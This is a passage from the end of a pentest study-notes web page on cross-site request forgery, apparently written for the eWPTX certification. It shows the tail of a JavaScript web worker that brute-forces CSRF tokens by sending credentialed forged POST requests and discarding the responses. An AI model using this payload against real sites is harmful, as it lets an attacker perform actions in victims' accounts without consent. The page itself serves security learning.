         <span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
         <span class="dl">"</span><span class="s2">CSRFToken</span><span class="dl">"</span><span class="p">:</span> <span class="nx">token</span><span class="p">,</span>
      <span class="p">};</span>

      <span class="nx">http</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
      <span class="nx">http</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">true</span><span class="dl">'</span><span class="p">;</span>

      <span class="c1">// Send the proper header information along with the request</span>
      <span class="nx">http</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
      <span class="nx">http</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
         <span class="k">if </span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// We don't care about responses</span>
            <span class="nx">http</span><span class="p">.</span><span class="nf">abort</span><span class="p">();</span>
         <span class="p">}</span>
      <span class="p">};</span>

      <span class="c1">// Serialize the data without using JQuery </span>
      <span class="nx">queryParams</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">).</span><span class="nf">reduce</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
         <span class="nx">a</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">k</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">=</span><span class="dl">'</span> <span class="o">+</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">params</span><span class="p">[</span><span class="nx">k</span><span class="p">]));</span>
         <span class="k">return</span> <span class="nx">a</span>
      <span class="p">},</span> <span class="p">[]).</span><span class="nf">join</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>
      <span class="nx">http</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">queryParams</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="kd">function</span> <span class="nf">Terminator</span><span class="p">()</span> <span class="p">{</span>
      <span class="nb">self</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">macacos me mordam</span><span class="dl">"</span><span class="p">);</span>
      <span class="nb">self</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
      <span class="k">return</span><span class="p">;</span>
   <span class="p">}</span>

   <span class="c1">// Brute Loop</span>
   <span class="nf">bruteLoop</span><span class="p">(</span><span class="nx">tokens</span><span class="p">);</span>
<span class="p">},</span> <span class="kc">false</span><span class="p">);</span>
 
</code></pre></div></div>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#advanced" class="page__taxonomy-item" rel="tag">advanced</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#ewptx" class="page__taxonomy-item" rel="tag">ewptx</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-30T00:00:00+06:00">November 30, 2023</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=5+-+Cross-site+request+forgery+%28CSRF%29%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fcsrf%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fcsrf%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fcsrf%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/notes/ewptx/xssfilter/" class="pagination--pager" title="4 - XSS Filter Evasion
">Previous</a>
    
    
      <a href="/notes/ewptx/html5/" class="pagination--pager" title="6 - HTML5
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">

    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>





  
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
  
    <script src="/assets/js/clipboard.js"></script>
  



  </body>
</html>
